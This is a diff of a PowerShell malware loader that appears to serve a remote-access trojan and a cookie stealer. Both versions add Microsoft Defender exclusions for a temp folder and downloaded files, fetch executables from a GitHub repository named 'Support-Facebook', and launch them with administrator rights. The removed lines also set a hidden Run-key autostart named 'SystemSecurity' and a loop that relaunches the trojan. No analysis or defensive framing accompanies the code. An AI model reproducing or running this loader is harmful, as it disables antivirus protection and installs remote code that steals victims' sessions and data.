@@ -1,35 +1,22 @@
-$systemPath = [System.IO.Path]::Combine($env:temp, "SystemTemp")
+$systemPath = [System.IO.Path]::Combine($env:temp, "System")
 New-Item -Path $systemPath -ItemType Directory -Force
+
 
 Add-MpPreference -ExclusionPath $systemPath
 
-$ratUrl = "https://github.com/PXTDEV9022/Support-Facebook/raw/refs/heads/main/Dlscj.exe"
-$ratPath = [System.IO.Path]::Combine($systemPath, "macro.exe")
+$cookieUrl = "https://github.com/PXTDEV9022/Support-Facebook/raw/refs/heads/main/Xclient.exe"
+$cookiePath = [System.IO.Path]::Combine($systemPath, "cookie.exe")
 
-Invoke-WebRequest -Uri $ratUrl -OutFile $ratPath
+Invoke-WebRequest -Uri $cookieUrl -OutFile $cookiePath
 
-Add-MpPreference -ExclusionProcess $ratPath
+Add-MpPreference -ExclusionProcess $cookiePath
 
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$regName = "SystemSecurity"
-$regValue = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ratPath`""
+$getfileUrl = "https://github.com/PXTDEV9022/Support-Facebook/raw/refs/heads/main/Dlscj.exe"
+$getfilePath = [System.IO.Path]::Combine($systemPath, "getfile.exe")
 
-if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
-    Set-ItemProperty -Path $regPath -Name $regName -Value $regValue
-}
+Invoke-WebRequest -Uri $getfileUrl -OutFile $getfilePath
 
-function Run-AsAdmin {
-    $process = New-Object System.Diagnostics.ProcessStartInfo
-    $process.FileName = $ratPath
-    $process.Verb = "runas"
-    $process.UseShellExecute = $true
-    [System.Diagnostics.Process]::Start($process)
-}
 
-while ($true) {
-    if (-not (Get-Process -Name "macro" -ErrorAction SilentlyContinue)) {
-        Start-Process -FilePath $ratPath
-        Run-AsAdmin
-    }
-    Start-Sleep -Seconds 32
-}
+Add-MpPreference -ExclusionProcess $getfilePath
+Start-Process -FilePath $cookiePath -Verb RunAs
+Start-Process -FilePath $getfilePath -Verb RunAs
